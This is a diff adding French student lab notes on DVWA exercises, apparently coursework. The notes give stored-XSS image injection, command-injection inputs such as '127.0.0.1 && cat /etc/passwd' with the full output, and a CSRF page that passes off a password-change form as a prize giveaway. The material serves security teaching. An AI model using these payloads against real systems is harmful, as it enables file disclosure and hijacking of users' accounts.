@@ -337,3 +337,177 @@ PHPSESSID=q9dir7tgnft0nejuplmarn13h1; security=low
 ```javascript
 window.location.assign("http://www.w3c.com")
 ```
+
+### XSS Stored, insérer une image :
+
+Il suffit de retirer l'attribut `maxlength` sur la balise du `textarea` ce
+qui permet de mettre la taille que l'on veut dedans. Ensuite, il suffit de 
+mettre le texte suivant et de l'envoyer :
+
+```html
+<img src="http://bridoz.com/wp-content/uploads/2015/03/215.jpg" />
+```
+
+ce qui nous donne un mignon petit Quokka sur notre page :
+
+![Selfie de Quokka](assets/quokka.png)
+
+### XSS Stored, niveau medium :
+
+Il suffit de faire la même chose mais dans l'input pour le nom.
+
+![Selfie de Quokka et son ami humain](assets/quokka2.png)
+
+## Exercice 4 (Command Injection)
+
+### Affichez la liste des fichiers à la racine
+
+Il suffit d'insérer le texte suivant dans l'input de la page et de
+valider :
+
+```
+127.0.0.1 && ls /
+```
+
+ce qui donne le résultat suivant :
+
+```
+PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
+64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.015 ms
+64 bytes from 127.0.0.1: icmp_seq=2 ttl=64 time=0.022 ms
+64 bytes from 127.0.0.1: icmp_seq=3 ttl=64 time=0.024 ms
+64 bytes from 127.0.0.1: icmp_seq=4 ttl=64 time=0.025 ms
+
+--- 127.0.0.1 ping statistics ---
+4 packets transmitted, 4 received, 0% packet loss, time 3003ms
+rtt min/avg/max/mdev = 0.015/0.021/0.025/0.006 ms
+bin
+boot
+cdrom
+dev
+etc
+home
+initrd.img
+initrd.img.old
+lib
+lib64
+lost+found
+media
+mnt
+opt
+proc
+root
+run
+sbin
+snap
+srv
+sys
+tmp
+usr
+var
+vmlinuz
+vmlinuz.old
+```
+
+On a donc le ping de localhost suivi de l'affichage de la liste des fichiers à
+la racine.
+
+### Faites afficher le contenu du fichier /etc/passwd
+
+On insère `127.0.0.1 && cat /etc/passwd` dans l'input et on a le contenu 
+suivant :
+
+```
+PING localhost (127.0.0.1) 56(84) bytes of data.
+64 bytes from localhost (127.0.0.1): icmp_seq=1 ttl=64 time=0.014 ms
+64 bytes from localhost (127.0.0.1): icmp_seq=2 ttl=64 time=0.021 ms
+64 bytes from localhost (127.0.0.1): icmp_seq=3 ttl=64 time=0.033 ms
+64 bytes from localhost (127.0.0.1): icmp_seq=4 ttl=64 time=0.048 ms
+
+--- localhost ping statistics ---
+4 packets transmitted, 4 received, 0% packet loss, time 2998ms
+rtt min/avg/max/mdev = 0.014/0.029/0.048/0.012 ms
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
+systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
+systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
+systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
+syslog:x:104:108::/home/syslog:/bin/false
+_apt:x:105:65534::/nonexistent:/bin/false
+messagebus:x:106:110::/var/run/dbus:/bin/false
+uuidd:x:107:111::/run/uuidd:/bin/false
+lightdm:x:108:114:Light Display Manager:/var/lib/lightdm:/bin/false
+whoopsie:x:109:116::/nonexistent:/bin/false
+avahi-autoipd:x:110:119:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/bin/false
+avahi:x:111:120:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/bin/false
+dnsmasq:x:112:65534:dnsmasq,,,:/var/lib/misc:/bin/false
+colord:x:113:123:colord colour management daemon,,,:/var/lib/colord:/bin/false
+speech-dispatcher:x:114:29:Speech Dispatcher,,,:/var/run/speech-dispatcher:/bin/false
+hplip:x:115:7:HPLIP system user,,,:/var/run/hplip:/bin/false
+kernoops:x:116:65534:Kernel Oops Tracking Daemon,,,:/:/bin/false
+pulse:x:117:124:PulseAudio daemon,,,:/var/run/pulse:/bin/false
+rtkit:x:118:126:RealtimeKit,,,:/proc:/bin/false
+saned:x:119:127::/var/lib/saned:/bin/false
+usbmux:x:120:46:usbmux daemon,,,:/var/lib/usbmux:/bin/false
+m2gil-16-17:x:1000:1000:m2gil-16-17,,,:/home/m2gil-16-17:/bin/bash
+mysql:x:121:129:MySQL Server,,,:/nonexistent:/bin/false
+etudiant:x:1001:1001:,,,:/home/etudiant:/bin/bash
+```
+
+### Faites afficher le contenu du fichier `/etc/shadow`
+
+Impossible, il faudrait que le groupe www-data ait même droits que root.
+
+## Exercice 5 (File Inclusion)
+
+<!-- TODO -->
+
+## Exercice 6 (File Upload)
+
+<!-- TODO -->
+
+## Exercice 7 (CSRF)
+
+### Expliquer comment forcer un utilisateur à modifier son mot de passe ?
+
+On se fait passer pour un site sûr avec un formulaire qui permet de récolter une
+donnée. On la récupère et on l'envoie au serveur tel quel.
+
+On a créé un exemple de page HTML pour cela :
+
+```html
+<!DOCTYPE html>
+<html>
+   <head>
+       <meta charset="utf-8">
+       <title>Message</title>
+   </head>
+   <body>
+       <form action="http://localhost/vulnerabilities/csrf/"
+           method="GET">
+           <p>Partage ton pseudo avec nous pour gagner un tas de cadeau !</p>
+           <input name="password_new" type="text">
+           <input name="password_conf" type="text">
+           <input value="Change" name="Change" type="submit">
+       </form>
+   </body>
+</html>
+```
+
